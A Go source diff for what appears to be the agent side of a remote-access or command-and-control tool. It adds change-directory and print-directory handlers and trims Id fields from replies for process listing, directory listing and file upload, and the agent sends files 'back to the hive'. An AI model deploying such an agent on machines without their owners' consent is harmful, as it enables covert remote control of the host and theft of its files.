@@ -50,10 +50,7 @@ func psHandler(send chan pb.Envelope, data []byte) {
 		log.Printf("failed to list procs %v", err)
 	}
 
-	psList := &pb.ProcessList{
-		Id:        psListReq.Id,
-		Processes: []*pb.Process{},
-	}
+	psList := &pb.ProcessList{Processes: []*pb.Process{}}
 
 	for _, proc := range procs {
 		psList.Processes = append(psList.Processes, &pb.Process{
@@ -81,10 +78,7 @@ func dirListHandler(send chan pb.Envelope, data []byte) {
 	dir, files, err := getDirList(dirListReq.Path)
 
 	// Convert directory listing to protobuf
-	dirList := &pb.DirList{
-		Id:   dirListReq.Id,
-		Path: dir,
-	}
+	dirList := &pb.DirList{Path: dir}
 	if err == nil {
 		dirList.Exists = true
 	} else {
@@ -116,6 +110,53 @@ func getDirList(target string) (string, []os.FileInfo, error) {
 		return dir, files, err
 	}
 	return dir, []os.FileInfo{}, errors.New("Directory does not exist")
+}
+
+func cdHandler(send chan pb.Envelope, data []byte) {
+	cdReq := &pb.CdReq{}
+	err := proto.Unmarshal(data, cdReq)
+	if err != nil {
+		log.Printf("error decoding message: %v", err)
+		return
+	}
+
+	os.Chdir(cdReq.Path)
+	dir, err := os.Getwd()
+	pwd := &pb.Pwd{Path: dir}
+	if err != nil {
+		pwd.Err = fmt.Sprintf("%v", err)
+	}
+
+	data, _ = proto.Marshal(pwd)
+	envelope := pb.Envelope{
+		Id:   cdReq.Id,
+		Type: "pwd",
+		Data: data,
+	}
+	send <- envelope
+}
+
+func pwdHandler(send chan pb.Envelope, data []byte) {
+	pwdReq := &pb.PwdReq{}
+	err := proto.Unmarshal(data, pwdReq)
+	if err != nil {
+		log.Printf("error decoding message: %v", err)
+		return
+	}
+
+	dir, err := os.Getwd()
+	pwd := &pb.Pwd{Path: dir}
+	if err != nil {
+		pwd.Err = fmt.Sprintf("%v", err)
+	}
+
+	data, _ = proto.Marshal(pwd)
+	envelope := pb.Envelope{
+		Id:   pwdReq.Id,
+		Type: "pwd",
+		Data: data,
+	}
+	send <- envelope
 }
 
 // Send a file back to the hive
@@ -160,10 +201,7 @@ func uploadHandler(send chan pb.Envelope, data []byte) {
 		return
 	}
 
-	upload := &pb.Upload{
-		Id:   uploadReq.Id,
-		Path: uploadReq.Path,
-	}
+	upload := &pb.Upload{Path: uploadReq.Path}
 	f, err := os.Create(uploadReq.Path)
 	if err != nil {
 		upload.Err = fmt.Sprintf("%v", err)
